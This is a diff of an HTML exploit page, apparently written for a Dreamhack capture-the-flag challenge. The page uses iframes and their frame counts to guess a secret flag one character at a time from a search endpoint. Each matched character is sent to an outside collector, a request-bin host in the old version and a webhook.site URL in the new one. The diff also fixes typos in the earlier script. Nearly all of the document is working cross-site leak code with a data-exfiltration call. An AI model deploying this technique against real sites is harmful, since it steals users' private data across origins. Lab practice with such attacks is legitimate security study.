@@ -1,39 +1,36 @@
 <!DOCTYPE html>
 <html>
-        <head>
-                <title>
-                </title>
-        </head>
-        <body>
-                <ul id="u"></ul>
-        <script>
-                function exploit(chr){
-                        var src = "https://127.0.0.1:8000/search?query=DH{";
-                        var iframe = document.createElement("iframe")
-                        iframe.src = src+chr;
-                        document.body.appenchild(iframe);
-                        iframe.onload = ()=>{
-                                var frame_num = iframe.contentWindow.frame.length
-                                if(frame_num == 1){
-                                        console.log(src);
-                                        const img = new Image();
-                                        img.src = "https://wrmmvyl.request.dreamhack.games/?char="+chr
-                                        document.body.appendChild(img)
-                                        return 123;
+<head>
+<title></title>
+</head>
+<body>
+<ul id="u"></ul>
+<script>
+    function exploit(chr){
+        var src = "http://127.0.0.1:8000/search?query=DH{";
+        //var src = "http://host3.dreamhack.games:15220/search?query=" //http://127.0.0.1:8000/search?query=
+        var iframe = document.createElement("iframe");
+        iframe.src = src+chr;
+        document.body.appendChild(iframe);
+        iframe.onload = ()=>{
+            var frame_num = iframe.contentWindow.frames.length
+            if(frame_num == 1){
+                console.log(src);
+                const img = new Image();
+                img.src = "https://webhook.site/47d29e63-9640-4e89-b1f7-6b1dcd6226d8/?char="+chr
+                document.body.appendChild(img);
+                return 123;
+            }
+            console.log(frame_num);
+            return 0;
+        };
+    };
 
-                                }
-                                console.log(frame_num)
-                                return 0;
-                        }
-
-                }
-                let chars = "abcdefghijklmnopqrstuvwxyz01234566789"
-                let flag = ""
-                for (let c of chars){
-                        exploit(flag+c)
-                }
-
-        </script>
-
-        </body>
+    let chars = "abcdefghijklmnopqrstuvwxyz0123456789"
+    let flag = "";
+    for (let c of chars) {
+        exploit(flag+c);
+    }
+</script>
+</body>
 </html>
